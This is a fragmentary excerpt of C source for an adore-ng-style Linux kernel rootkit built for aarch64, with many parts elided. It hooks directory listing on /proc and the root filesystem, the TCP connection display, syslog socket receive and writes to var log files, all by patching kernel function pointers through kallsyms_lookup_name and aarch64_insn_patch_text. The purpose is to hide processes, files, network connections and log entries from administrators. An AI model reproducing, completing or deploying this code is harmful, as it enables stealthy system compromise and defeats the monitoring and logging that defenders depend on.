...
void patch_pointer(unsigned long addr, unsigned long data);
...
int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	...
	r = orig_proc_readdir(fp, buf, filldir);
...
int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
{
	...
	if (!dentry) {
		...
		if (!dir->d_inode->i_op->lookup)
			return 0;
		if(dir->d_inode->i_op->lookup(dir->d_inode, dentry, 0) != 0) {
			return 0;
		}
	}
...
static int adore_opt_iterate(struct file *fp, struct dir_context *ctx)
{
	...
	struct dir_context new_ctx = {
		.actor = (filldir_t)adore_opt_filldir
	};
...
static int adore_proc_iterate(struct file *fp, struct dir_context *ctx)
{
	int r = 0;
	struct dir_context new_ctx = {
		.actor = (filldir_t)adore_proc_filldir
	};
...
static int adore_root_iterate(struct file *fp, struct dir_context *ctx)
{
	int r = 0;
	struct dir_context new_ctx = {
		.actor = (filldir_t)adore_root_filldir
	};
...
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
	patch_pointer((unsigned long)&new_op->readdir, (unsigned long)new_readdir);
#elif (LINUX_VERSION_CODE < KERNEL_VERSION(4, 8, 0))
	patch_pointer((unsigned long)&new_op->iterate, (unsigned long)new_iterate);
	printk(LOG_ADORE"patch vfs     : %p --> %p\n", *orig_iterate, new_iterate);
#else
	patch_pointer((unsigned long)&new_op->iterate_shared, (unsigned long)new_iterate);
	printk(LOG_ADORE"patch vfs     : %p --> %p\n", *orig_iterate, new_iterate);
#endif
				...
				)
{
	...
	new_op = (struct file_operations *)filep->f_op;
#if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))
	patch_pointer((unsigned long)&new_op->readdir, (unsigned long)orig_readdir);
#elif (LINUX_VERSION_CODE < KERNEL_VERSION(4, 8, 0))
	printk(LOG_ADORE"unpatch vfs     : %p --> %p\n", new_op->iterate, orig_iterate);
	patch_pointer((unsigned long)&new_op->iterate, (unsigned long)orig_iterate);
#else
	printk(LOG_ADORE"unpatch vfs     : %p --> %p\n", new_op->iterate_shared, orig_iterate);
	patch_pointer((unsigned long)&new_op->iterate_shared, (unsigned long)orig_iterate);
#endif
...
#else
static
int (*orig_unix_dgram_recvmsg)(struct socket *, struct msghdr *,
							   size_t, int) = NULL;
#endif
...
#else
int adore_unix_dgram_recvmsg(struct socket *sock, struct msghdr *msg, 
...
#else
	err = orig_unix_dgram_recvmsg(sock, msg, size, flags);
#endif
	return err;
}
...
static int patch_syslog(void)
{
	...
	if (sock && (unix_dgram_ops = (struct proto_ops *)sock->ops)) {
		...
		patch_pointer((unsigned long)&unix_dgram_ops->recvmsg, (unsigned long)adore_unix_dgram_recvmsg);
		sock_release(sock);
	}
...
typedef int (*my_set_memory_rw) (unsigned long addr, int numpages);
typedef int (*my_aarch64_insn_patch_text) (void *addrs[], u32 insns[], int cnt);

void patch_pointer(unsigned long addr, unsigned long data)
{
	my_aarch64_insn_patch_text func = NULL;
	void* addr_array[2];
	unsigned int data_array[2];

	func = (my_aarch64_insn_patch_text) kallsyms_lookup_name("aarch64_insn_patch_text");
	printk(LOG_ADORE"Adore Function Ptr: %p\n", func);
	if (func == NULL)
	{
		return ;
	}

	addr_array[0] = (void*) addr;
	addr_array[1] = (void*) (addr + 4);

	data_array[0] = (unsigned int) data;
	data_array[1] = (unsigned int) (data >> 32);

	func((void*)&addr_array, (void*)&data_array, 2);
	
	printk(LOG_ADORE"Adore Patch Complete\n");
}
...
int __init adore_init(void)
{
	...
	if (t_afinfo) {
		...
		patch_pointer((unsigned long)&t_afinfo->seq_ops.show, (unsigned long)adore_tcp4_seq_show);
	...
	for (i = 0; var_filenames[i]; ++i) {
		...
		if (!j) {	/* just replace one time, its all the same FS */
			...
			patch_pointer((unsigned long)&new_op->write, (unsigned long)adore_var_write);
#endif
			j = 1;
		}
	}
...
void __exit adore_cleanup(void)
{
	...
	if (t_afinfo && orig_tcp4_seq_show)
	{
		...
		patch_pointer((unsigned long)&t_afinfo->seq_ops.show, (unsigned long)orig_tcp4_seq_show);
	}
	...
	new_inode_op = (struct inode_operations *)filep->f_path.dentry->d_inode->i_op;
	patch_pointer((unsigned long)&new_inode_op->lookup, (unsigned long)orig_proc_lookup);
	...
	for (i = 0; var_filenames[i]; ++i) {
		if (var_files[i]) {
			if (!j) {
				new_op = (struct file_operations *)var_files[i]->f_op;
				patch_pointer((unsigned long)&new_op->write, (unsigned long)orig_var_write);
				j = 1;
			}
